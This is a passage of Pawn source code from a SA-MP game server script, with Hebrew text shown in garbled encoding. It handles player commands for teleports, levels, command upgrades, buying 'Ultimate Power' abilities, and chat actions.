						format(string,sizeof(string)," <> Level %02d: ",l);
						teles = 0, string = "";
					}
				}
			}
			teles = 0, string = "";
		}
		return 1;
	}
	if(equal(cmd,"/tm"))
	{
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä á÷øá àéùé");
		if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä áãøéôè");
		if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .àéðê éëåì ìùâø øëá îçðåú äîëåðéåú ùìà ùééê ìê");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		new Float:h, string[M_S_D], tname[M_S];
		GetPlayerHealth(playerid,h);
		if(h < levels[playerinfo[playerid][level]][TeleHealth])
		{
			format(string,sizeof(string)," .áøîúê äðåëçéú, àéðê éëåì ìäùúâø òí ôçåú î %.1f àçåæ çééí",levels[playerinfo[playerid][level]][TeleHealth]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		for(new i = 0; i < sizeof(Teleports); i++)
		{
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(tname,sizeof(tname),"%s%s\t\tLevel: %02d",tname,strs(" ",15-strlen(tname)),Teleports[i][Tl]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		ShowPlayerDialog(playerid,dialog_tm,DIALOG_STYLE_LIST," îòøëú ùéâåøéí // úôøéè ùéâåøéí",string,"äùúâø","ñâåø");
		return 1;
	}
	if(equal(cmd,"/nsteles"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :øùéîú äùéâåøéí ùàñåø ìéøåú áäí ~~~");
		new string[M_S], teles = 0;
		for(new i = 0; i < sizeof(Teleports); i++)
		{
			if(Teleports[i][Tnoshooting])
			{
				format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s, %s"),string,Teleports[i][Tcmd]);
				if(++teles >= 5 || i == sizeof(Teleports) - 1)
				{
					SendClientMessage(playerid,yellow,string);
					string = "", teles = 0;
				}
			}
		}
		return 1;
	}
	if(equal(cmd,"/stl"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :øùéîú äùéâåøéí äîéåçãéí ~~~");
		SendClientMessage(playerid,yellow,"  /skydive - ùéâåø ìàå÷ééðåñ, ìøîä 7  /wee - öðéçä îäî÷åí áå àúä ðîöà, ìøîä 8");
		SendClientMessage(playerid,yellow,"  /spawn - ùéâåø ìî÷åí ñôàåï øðãåîàìé, ìøîä 10  /army - ùéâåø ìîèåñ öðéçä îòì äöáà, ìøîä 1");
		SendClientMessage(playerid,yellow,"  /plane - ìøîä 1 ,LV ùéâåø ìîèåñ öðéçä îòì äòéø  /shooting - ÷ìéòä ìîèøä, ìøîä 5");
		return 1;
	}
	if(equal(cmd,"/tinfo"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tinfo [teleport name / list] :öåøú äùéîåù");
		if(equal(cmd,"list"))
		{
			playerinfo[playerid][tinfo] = 1;
			new string[M_S_D], tname[M_S];
			for(new i = 0; i < sizeof(Teleports); i++)
			{
				strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
				format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
			}
			ShowPlayerDialog(playerid,dialog_tm,DIALOG_STYLE_LIST," îòøëú ùéâåøéí // îéãò ùéâåø",string,"îéãò","ñâåø");
		}
		else
		{
			if(cmd[0] != '/') format(cmd,sizeof(cmd),"/%s",cmd);
			new string[M_S], t = -1;
			for(new i = 0; i < sizeof(Teleports); i++) if(equal(Teleports[i][Tcmd],cmd)) t = i;
			if(t == -1) return SendClientMessage(playerid,red," .ùí ùéâåø ùâåé");
			format(string,sizeof(string)," ~~~ :%s ôøèé äùéâåø ~~~",Teleports[t][Tcmd]);
			SendClientMessage(playerid,lightblue,string);
			format(string,sizeof(string),"  %02d :îñôø ñéãåøé",t);
			SendClientMessage(playerid,grey,string);
			if(!strlen(Teleports[t][Tauthor])) SendClientMessage(playerid,grey,"  ðåöø ò\"é öååú äðäìú äùøú");
			else
			{
				format(string,sizeof(string),"  %s ðåöø ò\"é",Teleports[t][Tauthor]);
				SendClientMessage(playerid,grey,string);
			}
			format(string,sizeof(string),"  áùéâåø æä %s ìú÷åó",Teleports[t][Tnoshooting] ? ("àñåø") : ("îåúø"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string),"  ùéâåø æä îùâø %s øëá",Teleports[t][Twithv] ? ("òí") : ("áìé"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string),"  %d ùéâåø æä ÷ééí áòåìí îñôø",Teleports[t][Tw]);
			SendClientMessage(playerid,grey,string);
		}
		return 1;
	}
	if(equal(cmd,"/level"))
	{
		new string[M_S];
		if(playerinfo[playerid][level] >= sizeof(levels)-1) return SendClientMessage(playerid,red," .àúä áøîä äî÷ñéîàìéú åìëï ìà úåëì ì÷áì îéãò ìâáé øîä âáåää éåúø");
		format(string,sizeof(string)," :áëãé ìòìåú ìøîä %d àúä öøéê",playerinfo[playerid][level]+1);
		SendClientMessage(playerid,red,string);
		format(string,sizeof(string)," %d$ äøéâåú å %d",levels[playerinfo[playerid][level]+1][NeedMoney],levels[playerinfo[playerid][level]+1][NeedKills]);
		SendClientMessage(playerid,red,string);
		new moremoney = levels[playerinfo[playerid][level]+1][NeedMoney]-GetMoney(playerid), morekills = levels[playerinfo[playerid][level]+1][NeedKills]-playerinfo[playerid][kills];
		format(string,sizeof(string)," çñøéí ìê %d$ å %d äøéâåú",moremoney < 0? 0:moremoney,morekills < 0? 0:morekills);
		SendClientMessage(playerid,red,string);
		return 1;
	}
	if(equal(cmd,"/levels"))
	{
		new string[M_S], cur = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /levels [number] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /levels 1 :äøîåú åîñôø äëñó åääøéâåú äãøåùéí ëãé ìäâéò àìéäí");
			SendClientMessage(playerid,white," /levels 2 :áåðåñéí îéåçãéí ìøîåú");
			SendClientMessage(playerid,white," /levels 3 :îéðéîåí çééí ìùéâåø");
			SendClientMessage(playerid,white," /levels 4 :çééí åîâï äîúîìàéí ìàçø ëì äøéâä");
			SendClientMessage(playerid,white," /levels 5 :î÷ñéîåí ëñó ááð÷ ðùîø ìàçø éöéàä îäùøú ìîùúîùéí øùåîéí");
			SendClientMessage(playerid,white," /levels 6 :î÷ñéîåí ëãåøéí ðùîøéí ìàçø éöéàä îäùøú ìîùúîùéí øùåîéí");
			return 1;
		}
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessage(playerid,lightblue," ~~~ :äøîåú åîñôø äëñó åääøéâåú äãøåùéí ëãé ìäâéò àìéäí ~~~");
				SendClientMessage(playerid,brown," (Level. Kills, Money)");
				for(new i=1;i<sizeof(levels);i+=5)
				{
					format(string,sizeof(string)," %d. %d, %d$ | %d. %d, %d$ | %d. %d, %d$ | %d. %d, %d$ | %d. %d, %d$",
					i,levels[i][NeedKills],levels[i][NeedMoney],
					i+1,levels[i+1][NeedKills],levels[i+1][NeedMoney],
					i+2,levels[i+2][NeedKills],levels[i+2][NeedMoney],
					i+3,levels[i+3][NeedKills],levels[i+3][NeedMoney],
					i+4,levels[i+4][NeedKills],levels[i+4][NeedMoney]);
					SendClientMessage(playerid,yellow,string);
				}
			}
			case 2:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áåðåñéí îéåçãéí ìøîåú ~~~");
				SendClientMessage(playerid,yellow,"  îøîä 5 ú÷áìå ôé 2 ëñó áàéæåøé äëñó");
				SendClientMessage(playerid,yellow,"  SeaSparrow îøîä 7 ééôúç ìëí äøëá");
				SendClientMessage(playerid,yellow,"  /healme îøîä 12 ééúîìà ìê äîâï áùéîåù áô÷åãä");
				SendClientMessage(playerid,yellow,"  îøîä 11 ú÷áìå âí îâï áàéæåøé ÷áìú ëñó");
				SendClientMessage(playerid,yellow,"  Rhino, Hunter, Hydra :îøîä 13 ééôúçå ìëí äøëáéí");
				SendClientMessage(playerid,yellow,"  îøîä 15 çééê ééúîìàå àåèåîèéú");
			}
			case 3:
			{
				SendClientMessage(playerid,lightblue," ~~~ :îéðéîåí çééí ìùéâåøéí ~~~");
				SendClientMessage(playerid,brown," (Level. Health)");
				cur = 0;
				for(new i=1;i<sizeof(levels);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %.1f") : ("%s | %d. %.1f"),string,i,levels[i][TeleHealth]);
					cur++;
					if(cur >= 5)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(levels)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			case 4:
			{
				SendClientMessage(playerid,lightblue," ~~~ :çééí åîâï äîúîìàéí ìàçø ëì äøéâä ~~~");
				SendClientMessage(playerid,brown," (Level. Health, Armour)");
				cur = 0;
				for(new i=1;i<sizeof(levels);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %.1f, %.1f") : ("%s | %d. %.1f, %.1f"),string,i,levels[i][DeathHealth],levels[i][DeathArmour]);
					cur++;
					if(cur >= 5)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(levels)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			case 5:
			{
				SendClientMessage(playerid,lightblue," ~~~ :î÷ñéîåí ëñó ááð÷ ðùîø ìàçø éöéàä îäùøú ìîùúîùéí øùåîéí ~~~");
				SendClientMessage(playerid,brown," (Level. Bank money limit)");
				cur = 0;
				for(new i=1;i<sizeof(levels);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %d") : ("%s | %d. %d"),string,i,levels[i][BankLimit] == -1? 0 : levels[i][BankLimit]);
					cur++;
					if(cur >= 5)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(levels)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			case 6:
			{
				SendClientMessage(playerid,lightblue," ~~~ :î÷ñéîåí ëãåøéí ðùîøéí ìàçø éöéàä îäùøú ìîùúîùéí øùåîéí ~~~");
				SendClientMessage(playerid,brown," (Level. Ammo limit)");
				cur = 0;
				for(new i=1;i<sizeof(levels);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %d") : ("%s | %d. %d"),string,i,levels[i][AmmoLimit]);
					cur++;
					if(cur >= 5)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(levels)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			default: SendClientMessage(playerid,red," .àôùøåú òæøä ùâåéä");
		}
		return 1;
	}
	if(equal(cmd,"/buylevel"))
	{
		new string[M_S];
		if(playerinfo[playerid][level] < sizeof(levels)-1)
		{
			if(playerinfo[playerid][kills] >= levels[playerinfo[playerid][level]+1][NeedKills] && GetMoney(playerid) >= levels[playerinfo[playerid][level]+1][NeedMoney])
			{
				playerinfo[playerid][level]++;
				new l = playerinfo[playerid][level], newCommands = 0;
				format(string,sizeof(string)," !òìä ìøîä %d %s - îæì èåá",l,GetName(playerid));
				SendClientMessageToAll(orange,string);
			    format(string,sizeof(string)," ~~~ ?òìéú ìøîä %d! îä çãù ~~~",l);
			    SendClientMessage(playerid,lightblue,string);
			    format(string,sizeof(string),"  %s :ùí äøîä ùìê äçãù äåà",levels[l][LevelName]);
			    SendClientMessage(playerid,yellow,string);
			    if(levels[l][BankLimit] > levels[l - 1][BankLimit] && levels[l][AmmoLimit] > levels[l - 1][AmmoLimit]) format(string,sizeof(string),"  (äâáìú äáð÷ äçãùä ùìê äéà %d$ (òìúä á $%d) åäâáìú îçñðéåú äðù÷ äçãùä ùìê äéà %d (òìúä á %d",levels[l][BankLimit],levels[l][BankLimit] - levels[l - 1][BankLimit],levels[l][AmmoLimit],levels[l][AmmoLimit] - levels[l - 1][AmmoLimit]);
			    else if(levels[l][BankLimit] > levels[l - 1][BankLimit]) format(string,sizeof(string),"  (äâáìú äáð÷ äçãùä ùìê äéà #%d (òìúä á #$%d",levels[l][BankLimit],levels[l][BankLimit] - levels[l - 1][BankLimit]);
			    else if(levels[l][AmmoLimit] > levels[l - 1][AmmoLimit]) format(string,sizeof(string),"  (äâáìú îçñðéåú äðù÷ äçãùä ùìê äéà %d (òìúä á %d",levels[l][AmmoLimit],levels[l][AmmoLimit] - levels[l - 1][AmmoLimit]);
			    else string = "";
			    if(strlen(string) > 0) SendClientMessage(playerid,yellow,string);
			    string = "";
			    for(new i = 0; i < sizeof(lcmds); i++) if(lcmds[i][lcLevel] == l) format(string,sizeof(string),!strlen(string) ? ("%s %d) %s") : ("%s  %d) %s"),string,++newCommands,lcmds[i][lcCommand]);
			    if(!newCommands) SendClientMessage(playerid,orange,"  ô÷åãåú çãùåú ìøîä ùìê: àéï");
				else
				{
					format(string,sizeof(string),"  %s :ô÷åãåú çãùåú ìøîä ùìê",string);
			    	SendClientMessage(playerid,orange,string);
			    }
			    string = "", newCommands = 0;
			    for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Tl] == l) format(string,sizeof(string),!strlen(string) ? ("%s %d) %s") : ("%s  %d) %s"),string,++newCommands,Teleports[i][Tcmd]);
			    if(!newCommands) SendClientMessage(playerid,orange,"  ùéâåøéí çãùéí ìøîä ùìê: àéï");
				else
				{
					format(string,sizeof(string),"  %s :ùéâåøéí çãùéí ìøîä ùìê",string);
			    	SendClientMessage(playerid,orange,string);
			    }
			    SendClientMessage(playerid,grey,"  /levels :ìôøèéí ðåñôéí àåãåú äøîåú");
				GiveMoney(playerid,0-levels[playerinfo[playerid][level]][NeedMoney]);
				if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Level",playerinfo[playerid][level]);
			}
			else
			{
				format(string,sizeof(string)," .çñøéí ìê %d$ å %d äøéâåú",levels[playerinfo[playerid][level]+1][NeedMoney]-GetMoney(playerid),levels[playerinfo[playerid][level]+1][NeedKills]-playerinfo[playerid][kills]);
				SendClientMessage(playerid,red,string);
			}
		}
		else SendClientMessage(playerid,red," .àúä áøîä äî÷ñéîàìéú åìëï àéðê éëåì ìòìåú øîä");
		return 1;
	}
	if(equal(cmd,"/lcmds"))
	{
		new string[M_S], menus = 0, s = sizeof(lcmds), menuchoosen = 0;
		menus = s / 8;
		if(s % 8 > 0) menus++;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
		    format(string,sizeof(string)," /lcmds [menu number 1 - %d] :öåøú äùéîåù",menus);
			SendClientMessage(playerid,white,string);
			SendClientMessage(playerid,green,"  ô÷åãåú áäï àúä éëåì ìäùúîù îñåîðåú áéøå÷");
			return SendClientMessage(playerid,red,"  ô÷åãåú áäï àéðê éëåì ìäùúîù îñåîðåú áàãåí");
		}
		menuchoosen = strval(cmd);
		if(menuchoosen < 1 || menuchoosen > menus) return SendClientMessage(playerid,red," .úôøéè ô÷åãåú ùâåé");
		format(string,sizeof(string)," ~~~ :úôøéè ô÷åãåú #%d ~~~",menuchoosen);
		SendClientMessage(playerid,lightblue,string);
		menuchoosen = strval(cmd) * 9 - 8;
		for(new i = menuchoosen; i < menuchoosen + 9; i++)
		{
		    if(i > sizeof(lcmds) - 1) break;
		    if(lcmds[i][lcCL]) format(string,sizeof(string),"  #%02d [%d øîä | CL %d/%d] %s: îçéø ùãøåâ - $%d | /lcinfo %s",i,lcmds[i][lcLevel],playerinfo[playerid][upgradecmd][i],lcmds[i][lcMaxCL],lcmds[i][lcCommand],lcmds[i][lcUpgradeCost],lcmds[i][lcCommand]);
		    else format(string,sizeof(string),"  #%02d [%d øîä] %s: àéï ùãøåâ | /lcinfo %s",i,lcmds[i][lcLevel],lcmds[i][lcCommand],lcmds[i][lcCommand]);
		    SendClientMessage(playerid,playerinfo[playerid][level] >= lcmds[i][lcLevel] ? green : red,string);
		}
		return 1;
	}
	if(equal(cmd,"/lcinfo"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /cinfo [command name] :öåøú äùéîåù");
		if(strfind(cmd,"/") == -1) format(cmd,sizeof(cmd),"/%s",cmd);
		if(lcmdid(cmd) == -1) return SendClientMessage(playerid,red," .ô÷åãä ùâåéä");
		format(string,sizeof(string)," %s îéãò òì äô÷åãä",cmd);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,lcmds[lcmdid(cmd)][lcExplain],"ñâåø","");
		return 1;
	}
	if(equal(cmd,"/cupgrade"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /cupgrade [command name] :öåøú äùéîåù");
		if(strfind(cmd,"/") == -1) format(cmd,sizeof(cmd),"/%s",cmd);
		new i = lcmdid(cmd);
		if(i == -1) return SendClientMessage(playerid,red," .ô÷åãä ùâåéä");
		if(playerinfo[playerid][upgradecmd][i] >= lcmds[i][lcMaxCL]) return SendClientMessage(playerid,red," .äâòú ëáø ìøîä äîà÷ñéîàìéú ùì ùéãøåâ äô÷åãä äæå");
		if(playerinfo[playerid][level] < lcmds[i][lcLevel]) return SendClientMessage(playerid,red," .àéðê áøîä äîúàéîä ìùãøåâ äô÷åãä äæå");
		if(GetMoney(playerid) < lcmds[i][lcUpgradeCost])
		{
		    format(string,sizeof(string)," .àéï ìê îñôé÷ ëñó. ùãøåâ äô÷åãä äæå òåìä $%d",lcmds[i][lcUpgradeCost]);
			return SendClientMessage(playerid,red,string);
		}
		playerinfo[playerid][upgradecmd][i]++;
		if(playerinfo[playerid][logged])
		{
			format(string,sizeof(string),"UpgradeCMD%d",i);
			fsetint(fuser(playerid),string,playerinfo[playerid][upgradecmd][i]);
		}
		GiveMoney(playerid,0-lcmds[i][lcUpgradeCost]);
		format(string,sizeof(string)," !ìøîú ùãøåâ %d îúåê %d %s ùéãøâú àú äô÷åãä",playerinfo[playerid][upgradecmd][i],lcmds[i][lcMaxCL],lcmds[i][lcCommand]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/upower"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /upower [help/list/buy/keys] :öåøú äùéîåù");
		if(equal(cmd,"help"))
		{
		    cmd = strtok(cmdtext,idx);
			new h = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
			if(h < 1 || h > 2) h = h > 2 ? 2 : 1;
			format(string,sizeof(string)," ~~~ :#%d Ultimate Power ~~~",h);
			SendClientMessage(playerid,lightblue,string);
			if(h == 1)
			{
				SendClientMessage(playerid,purple," » :?Ultimate Power îä æä");
				SendClientMessage(playerid,yellow,"  Ultimate Power = äëåç äàåìèéîèéáé, äéëåìú äçæ÷ä áéåúø ùéëåìä ìäéåú ìùç÷ï ùìê");
				SendClientMessage(playerid,yellow,"  (ðéúï ì÷ðåú ëåç ëæä áîçéø ùì " #upower_cost "$ | äëåç äàåìèéîèéáé ðùîø åðéúï ìäçìôä (áúùìåí ä÷ðééä");
				SendClientMessage(playerid,purple," » :?ëéöã ìäùúîù áëåç äæä");
				SendClientMessage(playerid,yellow,"  /upower keys - áã÷å ãøê äô÷åãä äæå áàéæä î÷ùéí úöèøëå ìäùúîù ëãé ìäôòéì àú äëåç");
				SendClientMessage(playerid,yellow,"  ,áîéãä åúòæáå àåúå ìàçø 4 ùðéåú, éäéä ùéîåù áëåç áøîä 1, áîéãä åúòæáå àåúå ìàçø 8 ùðéåú éäéä ùéîåù áøîä 2");
				SendClientMessage(playerid,yellow,"  áîéãä åúòæáå àåúå ìàçø 12 ùðéåú éäéä ùéîåù áøîä 3 åáîéãä åúòæáå àåúå ìàçø 16 ùðéåú - éäéä ùéîåù áøîä 4, äçæ÷ä áéåúø");
				SendClientMessage(playerid,grey," /upower help 2 :ìäîùê");
			}
			if(h == 2)
			{
				SendClientMessage(playerid,purple," » :ôøèéí ðåñôéí");
				SendClientMessage(playerid,yellow,"  áøîä 1 ùì äëåç ðéúï ìäùúîù îøîú ùç÷ï 10  áøîä 2 ùì äëåç ðéúï ìäùúîù îøîú ùç÷ï 20");
				SendClientMessage(playerid,yellow,"  áøîä 3 ùì äëåç ðéúï ìäùúîù îøîú ùç÷ï 30  áøîä 4 ùì äëåç ðéúï ìäùúîù îøîú ùç÷ï 40");
				SendClientMessage(playerid,purple," » :ô÷åãåú");
				SendClientMessage(playerid,orange," * /upower list - øùéîú äëåçåú äàåìèéîèéáééí ùðéúï ì÷ðåú");
				SendClientMessage(playerid,orange," * /upower buy - ÷ðééú ëåç àåìèéîèéáé");
				SendClientMessage(playerid,orange," * /upower keys - öôééä áî÷ùéí ìùéîåù áëåç àåìèéîèéáé, ò\"ô äîùç÷ ùìê");
				SendClientMessage(playerid,purple," » :ùéîåù áëåç ðåñó");
				SendClientMessage(playerid,yellow,"  /upower2 :ðéúðú àôùøåú ìäùúîù áåëç àåìèéîèéáé ðåñó! ìôøèéí");
			}
		}
		else if(equal(cmd,"list"))
		{
		    new list[M_S_D];
		    for(new i = 0; i < sizeof(UltimatePowers); i++) format(list,sizeof(list),!strlen(list) ? ("%s%s") : ("%s\n%s"),list,UltimatePowers[i][upTitle]);
		    ShowPlayerDialog(playerid,dialog_upowers,DIALOG_STYLE_LIST," øùéîú ëåçåú àåìèéîèéáééí",list,"îéãò","ñâåø");
		}
		else if(equal(cmd,"buy"))
		{
		    if(GetMoney(playerid) < upower_cost)
			{
			    format(string,sizeof(string)," .àéï ìê îñôé÷ ëñó, ëåç àåìèéîèéáé òåìä $%d",upower_cost);
				return SendClientMessage(playerid,red,string);
			}
		    cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /upower buy [upower id] :öåøú äùéîåù");
			new id = strval(cmd);
			if(id < 1 || id > sizeof(UltimatePowers)) return SendClientMessage(playerid,red," .îñôø ëåç àåìèéîèéáé ùâåé");
		    id--;
		    if(playerinfo[playerid][upower] == id) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áëåç äæä áúåø ëåç øàùåï");
		    if(playerinfo[playerid][upower2] == id) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áëåç äæä áúåø ëåç ùðé");
		    if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"UPower",id);
		    playerinfo[playerid][upower] = id;
		    GiveMoney(playerid,0-upower_cost);
		    format(string,sizeof(string)," » !÷ðä ëåç àåìèéîèéáé îñåâ: %s %s",UltimatePowers[id][upTitle],GetName(playerid));
		    SendClientMessageToAll(orange,string);
		    format(string,sizeof(string)," ~~~ :%s - Ultimate Power ~~~",UltimatePowers[id][upTitle]);
		    SendClientMessage(playerid,lightblue,string);
		    SendClientMessage(playerid,orange,UltimatePowers[id][upText]);
		    SendClientMessage(playerid,orange," /upower keys :òì îðú ìäùúîù áëåç úöèøê ììçåõ òì î÷ùéí. ëãé ìøàåú àéæä äùúîù áô÷åãä");
		    for(new i = 1; i <= 4; i++)
		    {
		    	format(string,sizeof(string)," øîä %d ùì äëåç (%s): %s",i,playerinfo[playerid][level] >= (i * 10) ? ("àúä éëåì ìäùúîù") : ("àéðê áøîä äîñôé÷ä ìùéîåù"),upLevelName(id,i));
		    	SendClientMessage(playerid,playerinfo[playerid][level] >= (i * 10) ? green : red,string);
		    }
		}
		else if(equal(cmd,"keys")) GameTextForPlayer(playerid,"~b~ultimate power keys:~n~~y~~k~~SNEAK_ABOUT~ ~b~+ ~y~~k~~PED_SPRINT~",4500,0);
		else return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/upower2"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /upower2 [help/list/buy] :öåøú äùéîåù");
		if(equal(cmd,"help"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :Second Ultimate Power ~~~");
			SendClientMessage(playerid,purple," » :?Second Ultimate Power îä æä");
			SendClientMessage(playerid,yellow,"  Second Ultimate Power = ëåç àåìèéîèéáé îùðé");
			SendClientMessage(playerid,yellow,"  ðéúï ì÷áì ëåç ðåñó(!) ìùìéèä òìéå ëê ùúåëìå ìùìåè âí áëåç äøàùåï åâí áùðé");
			SendClientMessage(playerid,yellow,"  ëåç àåìèéîèéáé îùðé òåìä ëîòè îçéø ëôåì. ÷ðå àåúå ø÷ àí éù ìëí îñôé÷ ëñó");
			SendClientMessage(playerid,purple," » :?ëéöã ìäùúîù áëåç äæä");
			SendClientMessage(playerid,yellow,"  :áãéå÷ ëîå áëåç äøàùåï, ø÷ ùëàï òìéê ììçåõ òì ùðé î÷ùéí áéçã");
			SendClientMessage(playerid,yellow,"  î÷ù ä÷ôéöä + î÷ù äøéöä");
			SendClientMessage(playerid,yellow,"  [òì îðú ìøàåú áãéå÷ òì àéæä î÷ùéí úöèøê ììçåõ /upower2 keys äùúîù áô÷åãä]");
		}
		else if(equal(cmd,"list")) command(playerid,"/upower list");
		else if(equal(cmd,"buy"))
		{
		    if(GetMoney(playerid) < (upower_cost + (upower_cost / 2)))
			{
			    format(string,sizeof(string)," .àéï ìê îñôé÷ ëñó, ëåç àåìèéîèéáé ùðé òåìä $%d",upower_cost + (upower_cost / 2));
				return SendClientMessage(playerid,red,string);
			}
		    cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /upower2 buy [upower id] :öåøú äùéîåù");
			new id = strval(cmd) - 1;
			if(id < 1 || id > sizeof(UltimatePowers)) return SendClientMessage(playerid,red," .îñôø ëåç àåìèéîèéáé ùâåé");
		    if(playerinfo[playerid][upower] == id) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áëåç äæä áúåø ëåç øàùåï");
		    if(playerinfo[playerid][upower2] == id) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áëåç äæä áúåø ëåç ùðé");
		    if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"UPower2",id);
		    playerinfo[playerid][upower2] = id;
		    GiveMoney(playerid,0-(upower_cost + (upower_cost / 2)));
		    format(string,sizeof(string)," » !÷ðä ëåç àåìèéîèéáé ùðé îñåâ: %s %s",UltimatePowers[id][upTitle],GetName(playerid));
		    SendClientMessageToAll(orange,string);
		    format(string,sizeof(string)," ~~~ :%s - Second Ultimate Power ~~~",UltimatePowers[id][upTitle]);
		    SendClientMessage(playerid,lightblue,string);
		    SendClientMessage(playerid,orange,UltimatePowers[id][upText]);
		    SendClientMessage(playerid,orange," /upower2 keys :òì îðú ìäùúîù áëåç úöèøê ììçåõ òì î÷ùéí. ëãé ìøàåú àéæä äùúîù áô÷åãä");
		    for(new i = 1; i <= 4; i++)
		    {
		    	format(string,sizeof(string)," øîä %d ùì äëåç (%s): %s",i,playerinfo[playerid][level] >= (i * 10) ? ("àúä éëåì ìäùúîù") : ("àéðê áøîä äîñôé÷ä ìùéîåù"),upLevelName(id,i));
		    	SendClientMessage(playerid,playerinfo[playerid][level] >= (i * 10) ? green : red,string);
		    }
		}
		else if(equal(cmd,"keys")) GameTextForPlayer(playerid,"~b~second ultimate power keys:~n~~y~~k~~TOGGLE_SUBMISSIONS~ ~b~+ ~y~~k~~SNEAK_ABOUT~",4500,0);
		else return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(lcmdid(cmd) != -1)
	{
	    if(playerinfo[playerid][level] < lcmds[lcmdid(cmd)][lcLevel])
	    {
	        format(cmdstring,sizeof(cmdstring)," .ìùéîåù áô÷åãä æå òìéê ìäéåú áøîä %d",lcmds[lcmdid(cmd)][lcLevel]);
	        return SendClientMessage(playerid,red,cmdstring);
	    }
	}
	if(equal(cmd,"/me"))
	{
		new text[256], string[M_S];
		if((chatlocked || playerinfo[playerid][mute][0] > 0) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ìà úåëì ìäùúîù áô÷åãä äæå áîöáê äðåëçé");
		text = strrest(cmdtext,idx);
		if(!strlen(text)) return SendClientMessage(playerid,white," /me [text] :öåøú äùéîåù");
		if(equal(playerinfo[playerid][lastmetext],text)) return SendClientMessage(playerid,red," !me àñåø ìäöéó á");
		format(string,sizeof(string)," ** %s %s",GetName(playerid),text);
		SendClientMessageToAll(blue,string);
		SetString(playerinfo[playerid][lastmetext],text);
		SetPlayerChatBubble(playerid,text,blue,20.0,10000);
		return 1;
	}
	if(equal(cmd,"/cbubble"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /cbubble [text] :öåøú äùéîåù");
		SendClientMessage(playerid,blue," :äè÷ñè äáà ðåñó îòì ãîåúê");
		SendClientMessage(playerid,blue,cmd);
